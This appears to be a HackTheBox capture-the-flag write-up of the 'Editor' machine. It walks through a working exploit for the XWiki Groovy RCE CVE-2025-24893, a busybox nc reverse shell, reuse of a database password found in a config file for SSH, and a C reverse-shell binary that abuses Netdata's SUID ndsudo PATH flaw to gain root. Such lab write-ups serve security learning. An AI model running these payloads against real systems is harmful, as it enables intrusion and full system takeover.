---
layout: post
title: "week 12 editor"
date: 2025-08-09 00:00:00 -0700
categories: challenges
description: Xwiki site vuln to NetData bad perms vuln.
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "xwiki"
- "netdata"
- "suid"
- "setuid"
- "groovy"
- "linux"
- "gcc"
- "easy"
---

# week12-editor

## Engagement Notes
This box starts off with a linked wiki endpoint that is a reversed proxy behind the main application. This endpoint has a vulnerability that allows RCE via an unauthenticated groovy script endpoint. Embedded in the config files of the application is a credential that we can use to access the user ssh session. The user has access to a netdata binary with suid set and vulnerable to setting arbitrary paths. By compiling a malicious app and setting UID, then calling it from the netdata binary, we can escalate to root.

# Enumeration

### Set variables and baseline functions for further engagement


```python
from utils import * # Use `widget.summary()` to get all the premade code blocks

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'editor.htb'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.31']
    target: editor.htb


### Port scan target


```python
!rustscan -a $target
```

    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : http://discord.skerritt.blog         :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    🌍HACK THE PLANET🌍
    
    [~] The config file is expected to be at "/home/tokugero/.rustscan.toml"
    [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open 10.129.191.67:22
    Open 10.129.191.67:80
    Open 10.129.191.67:8080
    [~] Starting Script(s)
    [~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-02 19:07 -0700
    Initiating Ping Scan at 19:07
    Scanning 10.129.191.67 [2 ports]
    Completed Ping Scan at 19:07, 0.09s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 19:07
    Completed Parallel DNS resolution of 1 host. at 19:08, 0.50s elapsed
    DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
    Initiating Connect Scan at 19:08
    Scanning 10.129.191.67 [3 ports]
    Discovered open port 8080/tcp on 10.129.191.67
    Discovered open port 22/tcp on 10.129.191.67
    Discovered open port 80/tcp on 10.129.191.67
    Completed Connect Scan at 19:08, 0.09s elapsed (3 total ports)
    Nmap scan report for 10.129.191.67
    Host is up, received syn-ack (0.087s latency).
    Scanned at 2025-08-02 19:08:00 PDT for 0s
    
    PORT     STATE SERVICE    REASON
    22/tcp   open  ssh        syn-ack
    80/tcp   open  http       syn-ack
    8080/tcp open  http-proxy syn-ack
    
    Read data files from: /nix/store/wgw89vb58b7xdp5zk2r9fqy2qq3xxdd6-nmap-7.97/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
    


We find 22, 80, and 8080 open. 80 and 8080 are both likely web apps, so lets start enumerating those.

### URL scan target


```python
!gobuster dir -u http://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 --timeout=6s
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://editor.htb
    [+] Method:                  GET
    [+] Threads:                 40
    [+] Wordlist:                /nix/store/095gag0xj3zs6avrxrmn0996im9gzbyz-wordlists-collection/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              txt,js,html,php
    [+] Timeout:                 6s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html          0 (0.03%) (Status: 200) [Size: 631]
    /assets              20 (0.35%) (Status: 301) [Size: 178] [--> http://editor.htb/assets/]
    Progress: 25578 / 408220 (6.27%)[ERROR] Get "http://editor.htb/200607": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    [ERROR] Get "http://editor.htb/2006-august.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    [ERROR] Get "http://editor.htb/signals.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    [ERROR] Get "http://editor.htb/load.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    Progress: 92017 / 408220 (22.54%)
    [!] Keyboard interrupt detected, terminating.
    Progress: 92135 / 408220 (22.57%)
    ===============================================================
    Finished
    ===============================================================
    ^C



```python
!gobuster vhost -u http://$target -w$(wordlists_path)/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 40 --timeout=6s --append-domain
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:             http://editor.htb
    [+] Method:          GET
    [+] Threads:         40
    [+] Wordlist:        /nix/store/095gag0xj3zs6avrxrmn0996im9gzbyz-wordlists-collection/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    [+] User Agent:      gobuster/3.6
    [+] Timeout:         6s
    [+] Append Domain:   true
    ===============================================================
    Starting gobuster in VHOST enumeration mode
    ===============================================================
    Foundess: 45 / 114443 (0.04%): wiki.editor.htb Status: 302 [Size: 0] [--> http://wiki.editor.htb/xwiki]
    Progress: 2447 / 114443 (2.14%)
    [!] Keyboard interrupt detected, terminating.
    Progress: 2632 / 114443 (2.30%)
    ===============================================================
    Finished
    ===============================================================
    ^C


On the wiki.editor.htb endpoint, we find that it is an XWiki instance of version 15.10.8. We don't find any explicit vulnerabilities for this version, but we find one that's not patched for a few versions after this.

We'll need to modify the OP's script a hair to fit our needs, but eventually we can identify a binary that will let us phone home and get a shell.


```python
#https://www.exploit-db.com/exploits/52136
import requests
import urllib
# Banner
def display_banner():
    print("="*80)
    print("Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code")
    print("Exploit Author: Al Baradi Joy")
    print("GitHub Exploit: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py")
    print("="*80)

    # Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"

    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
        return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")

    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
        return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

    # Exploit function
def exploit(target_url, payload):
    target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip())
    # Tried doing RCE for revshell here and couldn't convert
    # cat /usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF/xwiki.cfg > gets config
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln({payload}.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"

    try:
        print(f"[+] Sending request to: {exploit_url}")
        response = requests.get(exploit_url)

        pprint(response.text)

    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")


```

Using our modified CVE script, we can see the contents of directories and start sleuthing around to get a foothold.


```python
# Main execution
payload = urllib.parse.quote("'ls -alhn'")
exploit(f'wiki.{target}/xwiki', payload)
```

    [!] HTTPS not available, falling back to HTTP.
    [✔] Target supports HTTP: http://wiki.editor.htb/xwiki
    [+] Sending request to: ...
     'feed for search on [}}}total 72K<br/>drwxr-xr-x &nbsp;5 0 0 4.0K Jul 29 '
     '11:48 .<br/>drwxr-xr-x 91 0 0 4.0K Jul 29 11:55 ..<br/>drwxr-xr-x &nbsp;6 0 '
     '0 4.0K Jul 29 11:48 jetty<br/>lrwxrwxrwx &nbsp;1 0 0 &nbsp;&nbsp;14 Mar 27 '
     '&nbsp;2024 logs -&gt; /var/log/xwiki<br/>drwxr-xr-x &nbsp;2 0 0 4.0K Jul 29 '
     '11:48 start.d<br/>-rw-r<del>r</del> &nbsp;1 0 0 5.5K Mar 27 &nbsp;2024 '
     'start_xwiki.bat<br/>-rw-r<del>r</del> &nbsp;1 0 0 6.1K Mar 27 &nbsp;2024 '
     'start_xwiki_debug.bat<br/>-rw-r<del>r</del> &nbsp;1 0 0 &nbsp;11K Mar 27 '
     '&nbsp;2024 start_xwiki_debug.sh<br/>-rw-r<del>r</del> &nbsp;1 0 0 9.2K Mar '
     '27 &nbsp;2024 start_xwiki.sh<br/>-rw-r<del>r</del> &nbsp;1 0 0 2.5K Mar 27 '
     '&nbsp;2024 stop_xwiki.bat<br/>-rw-r<del>r</del> &nbsp;1 0 0 6.6K Mar 27 '
     '&nbsp;2024 stop_xwiki.sh<br/>drwxr-xr-x &nbsp;3 0 0 4.0K Jun 13 17:08 '
     'webapps]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '



```python
payload = urllib.parse.quote("'pwd'")
exploit(f'wiki.{target}/xwiki', payload)
```

    [!] HTTPS not available, falling back to HTTP.
    [✔] Target supports HTTP: http://wiki.editor.htb/xwiki
    [+] Sending request to: ...
     'feed for search on '
     '[}}}/usr/lib/xwiki-jetty



```python
payload = urllib.parse.quote("'ls -alhn /usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF/'")
exploit(f'wiki.{target}/xwiki', payload)
```

    [!] HTTPS not available, falling back to HTTP.
    [✔] Target supports HTTP: http://wiki.editor.htb/xwiki
    [+] Sending request to: ...
     'feed for search on [}}}total 280K<br/>drwxr-xr-x 4 0 0 4.0K Jul 29 11:48 '
     '.<br/>drwxr-xr-x 7 0 0 4.0K Jul 29 11:46 ..<br/>lrwxrwxrwx 1 0 0 '
     '&nbsp;&nbsp;16 Mar 27 &nbsp;2024 cache -&gt; /etc/xwiki/cache<br/>drwxr-xr-x '
     '2 0 0 4.0K Jul 29 11:46 classes<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;16 Mar 27 '
     '&nbsp;2024 fonts -&gt; /etc/xwiki/fonts<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;28 '
     'Mar 27 &nbsp;2024 hibernate.cfg.xml -&gt; '
     '/etc/xwiki/hibernate.cfg.xml<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;41 Mar 27 '
     '&nbsp;2024 jboss-deployment-structure.xml -&gt; '
     '/etc/xwiki/jboss-deployment-structure.xml<br/>lrwxrwxrwx 1 0 0 '
     '&nbsp;&nbsp;24 Mar 27 &nbsp;2024 jetty-web.xml -&gt; '
     '/etc/xwiki/jetty-web.xml<br/>drwxr-xr-x 2 0 0 264K Jul 29 11:46 '
     'lib<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;22 Mar 27 &nbsp;2024 observation -&gt; '
     '/etc/xwiki/observation<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;22 Mar 27 &nbsp;2024 '
     'portlet.xml -&gt; /etc/xwiki/portlet.xml<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;22 '
     'Mar 27 &nbsp;2024 sun-web.xml -&gt; /etc/xwiki/sun-web.xml<br/>lrwxrwxrwx 1 '
     '0 0 &nbsp;&nbsp;29 Mar 27 &nbsp;2024 version.properties -&gt; '
     '/etc/xwiki/version.properties<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;18 Mar 27 '
     '&nbsp;2024 web.xml -&gt; /etc/xwiki/web.xml<br/>lrwxrwxrwx 1 0 0 '
     '&nbsp;&nbsp;20 Mar 27 &nbsp;2024 xwiki.cfg -&gt; '
     '/etc/xwiki/xwiki.cfg<br/>lrwxrwxrwx 1 0 0 &nbsp;&nbsp;28 Mar 27 &nbsp;2024 '
     'xwiki-locales.txt -&gt; /etc/xwiki/xwiki-locales.txt<br/>lrwxrwxrwx 1 0 0 '
     '&nbsp;&nbsp;27 Mar 27 &nbsp;2024 xwiki.properties -&gt; '
     '/etc/xwiki/xwiki.properties]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '



We won't know this until a bit later, but it seems like this output is truncated.


```python
payload = urllib.parse.quote("'grep -R \"password\" /usr/lib/xwiki-jetty/'")
exploit(f'wiki.{target}/xwiki', payload)
```

    [!] HTTPS not available, falling back to HTTP.
    [✔] Target supports HTTP: http://wiki.editor.htb/xwiki
    [+] Sending request to: ...
     'feed for search on '
     '[}}}/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/login.vm: '
     '&nbsp;&nbsp;&nbsp;&lt;input type="password" id="j_password" size="60" '
     'name="j_password" value="" '
     'autocomplete=\'current-password\'/&gt;<br/>/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/less/forms.less:input[type="password"],<br/>/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/less/forms.less:select.input-sm, '
     'input[type="text"].input-sm, input[type="password"].input-sm '
     '&#123;<br/>/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/less/forms.less:select.input-lg, '
     'input[type="text"].input-lg, input[type="password"].input-lg '
     '&#123;<br/>/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/less/forms.less: '
     '&nbsp;input[type="password"],<br/>/usr/lib/xwiki-jetty/webapps/xwiki/skins/flamingo/less/bootstrap/<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '
     'href="forms.less://"><span '
     'class="wikigeneratedlinkcontent">forms.less://</span></a></span> '
     'input[type="password"]]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '



This payload will get us a shell, then we can really start to dig around. Trying `nc`, `/bin/bash`, and other revshell shells, we continuosly get no connection to our listener. Eventually we find that busybox is installed, and its `nc` command works. We can use that to get a shell.


```python
payload = urllib.parse.quote("'busybox nc 10.10.14.31 9999 -e /bin/bash'")
exploit(f'wiki.{target}/xwiki', payload)
```

    [!] HTTPS not available, falling back to HTTP.
    [✔] Target supports HTTP: http://wiki.editor.htb/xwiki
    [+] Sending request to: http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%27busybox%20nc%2010.10.14.31%209999%20-e%20/bin/bash%27.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d
    ('<p>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;rss xmlns:dc="<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '
     'href="http://purl.org/dc/elements/1.1/"><span '
     'class="wikigeneratedlinkcontent">http://purl.org/dc/elements/1.1/</span></a></span>" '
     'version="2.0"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS '
     'feed for search on '
     '[}}}]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span '
     'class="wikiexternallink"><a class="wikimodel-freestanding" '
     'href="http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27busybox%20nc%2010.10.14.31%209999%20-e%20%2Fbin%2Fbash%27.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"><span '
     'class="wikigeneratedlinkcontent">http://wiki.editor.htb:80/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27busybox%20nc%2010.10.14.31%209999%20-e%20%2Fbin%2Fbash%27.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS '
     'feed for search on '
     '[}}}]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright '
     '/&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights '
     '/&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div '
     'class="wikimodel-emptyline"></div><div class="wikimodel-emptyline"></div>')


Now that we have access, another `grep -C 2 -R "password" .` nets us some gold
```bash
./webapps/xwiki/WEB-INF/hibernate.cfg.xml-    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
./webapps/xwiki/WEB-INF/hibernate.cfg.xml-    <property name="hibernate.connection.username">xwiki</property>
./webapps/xwiki/WEB-INF/hibernate.cfg.xml:    <property name="hibernate.connection.password">OLIVERCREDS</property>
```

Before we go too far, lets see if this credential works to get us on the box...


```python
oliver_ssh = ssh(target, 22, username='oliver', password='OLIVERCREDS')
print(oliver_ssh.exec('ls -alhn; cat user.txt'))
```

    total 28K
    drwxr-x--- 3 1000 1000 4.0K Jul  8 08:34 .
    drwxr-xr-x 3    0    0 4.0K Jul  8 08:34 ..
    lrwxrwxrwx 1    0    0    9 Jul  1 19:19 .bash_history -> /dev/null
    -rw-r--r-- 1 1000 1000  220 Jun 13 09:45 .bash_logout
    -rw-r--r-- 1 1000 1000 3.7K Jun 13 09:45 .bashrc
    drwx------ 2 1000 1000 4.0K Jul  8 08:34 .cache
    -rw-r--r-- 1 1000 1000  807 Jun 13 09:45 .profile
    -rw-r----- 1    0 1000   33 Aug  2 19:02 user.txt
    b3e92897100d3961e41016ea561bed8d


A common place to look for custom behaviors is `/opt/netdata`. I found this folder while sleuthing for the credentials earlier, but coming back to this with access we can start to see folders for which we have permissions.


```python
print(oliver_ssh.exec('id; ls -alhn /opt/netdata'))
```

    uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
    total 32K
    drwxr-xr-x 8   0   0 4.0K Jul  8 08:34 .
    drwxr-xr-x 4   0   0 4.0K Jul  8 08:34 ..
    drwxr-xr-x 3   0   0 4.0K Jul  8 08:34 bin
    drwxr-xr-x 3   0   0 4.0K Jul  8 08:34 etc
    lrwxrwxrwx 1   0   0   11 Jun 15 16:33 netdata-configs -> etc/netdata
    lrwxrwxrwx 1   0   0   15 Jun 15 16:33 netdata-dbs -> var/lib/netdata
    lrwxrwxrwx 1   0   0   15 Jun 15 16:33 netdata-logs -> var/log/netdata
    lrwxrwxrwx 1   0   0   17 Jun 15 16:33 netdata-metrics -> var/cache/netdata
    lrwxrwxrwx 1   0   0   19 Jun 15 16:33 netdata-plugins -> usr/libexec/netdata
    lrwxrwxrwx 1   0   0   21 Jun 15 16:33 netdata-web-files -> usr/share/netdata/web
    lrwxrwxrwx 1   0   0    3 Jun 15 16:33 sbin -> bin
    drwxr-xr-x 6   0   0 4.0K Jul  8 08:34 share
    drwxr-xr-x 2   0   0 4.0K Jul  8 08:34 system
    drwxr-xr-x 5   0   0 4.0K Jul  8 08:34 usr
    drwxr-xr-x 6 996 999 4.0K Jul  8 08:34 var


We also can see new ports that are only open for localhost. If we add `-L 19999:localhost:19999` to our ssh command, we can access the netdata dashboard.


```python
print(oliver_ssh.exec('netstat -tulpn'))
```

    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:45551         0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::80                   :::*                    LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
    tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      -                   
    udp        0      0 127.0.0.1:8125          0.0.0.0:*                           -                   
    udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -


On the dashboard, we can see version for the app is v1.45.2, a version encompassed by the following CVE:  
https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

In this, ndsudo is shipped with SUID set for root, executable by the group our user is in, and the vulnerability specifically is that we can set the path arbitrarily to include our own versions of executables that ndsudo will attempt to execute.

The next few commands are verifying the state and lining up our exploit.

Find the supposedly vulnerable binary:


```python
print(oliver_ssh.exec('find / -name "ndsudo" 2>/dev/null'))
```

    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo


Verify the executable binaries we'll need to hijack:


```python
print(oliver_ssh.exec('/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h'))
```

    ndsudo
    
    (C) Netdata Inc.
    
    A helper to allow Netdata run privileged commands.
    
      --test
        print the generated command that will be run, without running it.
    
      --help
        print this message.
    
    The following commands are supported:
    
    - Command    : nvme-list
      Executables: nvme 
      Parameters : list --output-format=json
    
    - Command    : nvme-smart-log
      Executables: nvme 
      Parameters : smart-log {{device}} --output-format=json
    
    - Command    : megacli-disk-info
      Executables: megacli MegaCli 
      Parameters : -LDPDInfo -aAll -NoLog
    
    - Command    : megacli-battery-info
      Executables: megacli MegaCli 
      Parameters : -AdpBbuCmd -aAll -NoLog
    
    - Command    : arcconf-ld-info
      Executables: arcconf 
      Parameters : GETCONFIG 1 LD
    
    - Command    : arcconf-pd-info
      Executables: arcconf 
      Parameters : GETCONFIG 1 PD
    
    The program searches for executables in the system path.
    
    Variables given as {{variable}} are expected on the command line as:
      --variable VALUE
    
    VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .


I tried msfvenom and got stuck for a while, you'll note that there's an extra `setuid(0)` here which is a requisite in the call chain for my binary to execute as root. 


```python
!cat arcconf.c
```

    #include <stdio.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    
    int main(void){
        int port = 9999;
        struct sockaddr_in revsockaddr;
    
        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.31");
    
        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);
    
        char * const argv[] = {"/bin/bash", NULL};
        setuid(0);
        execvp("/bin/bash", argv);
    
        return 0;       
    }


Warnings are just a suggestion anyway.

```sh
$ gcc -o arcconf arcconf.c -static
arcconf.c: In function ‘main’:
arcconf.c:25:5: warning: ignoring return value of ‘setuid’ declared with attribute ‘warn_unused_result’ [-Wunused-result]
   25 |     setuid(0);
      |     
```

Finally we ship our payload and ensure it's ready to run


```python
oliver_ssh.put('arcconf', '/home/oliver/arcconf')
print(oliver_ssh.exec('chown 1000:999 /home/oliver/arcconf'))
print(oliver_ssh.exec('chmod 777 /home/oliver/arcconf'))
print(oliver_ssh.exec('ls -alhn /home/oliver/'))

```

    
    
    total 2.2M
    drwxr-x--- 3 1000 1000 4.0K Aug  3 04:38 .
    drwxr-xr-x 3    0    0 4.0K Jul  8 08:34 ..
    -rwxrwxrwx 1 1000  999 757K Aug  3 04:38 arcconf
    lrwxrwxrwx 1    0    0    9 Jul  1 19:19 .bash_history -> /dev/null
    -rw-r--r-- 1 1000 1000  220 Jun 13 09:45 .bash_logout
    -rw-r--r-- 1 1000 1000 3.7K Jun 13 09:45 .bashrc
    drwx------ 2 1000 1000 4.0K Jul  8 08:34 .cache
    -rw-r--r-- 1 1000 1000  807 Jun 13 09:45 .profile
    -rw-r----- 1    0 1000   33 Aug  2 19:02 user.txt


Here's validation that SUID is set correctly for our scenario:


```python
print(oliver_ssh.exec('stat /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo'))
```

    File: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
      Size: 200576    	Blocks: 392        IO Block: 4096   regular file
    Device: 802h/2050d	Inode: 49411       Links: 1
    Access: (4750/-rwsr-x---)  Uid: (    0/    root)   Gid: (  999/ netdata)
    Access: 2025-08-02 19:01:19.967998975 +0000
    Modify: 2024-04-01 15:37:52.000000000 +0000
    Change: 2025-07-08 08:34:35.912296731 +0000
     Birth: 2025-06-15 16:32:57.965202926 +0000


And finally executing our payload with the path updated:


```python
oliver_ssh.exec('export PATH=$PATH:/home/oliver; /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-ld-info')
```




    ''



Our listener now catches the shell and we are root.

```sh
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.191.67 41242
whoami
root
cat /root/root.txt
d4d8422dfbb9ffccd9f3fedcd9a4b668
```
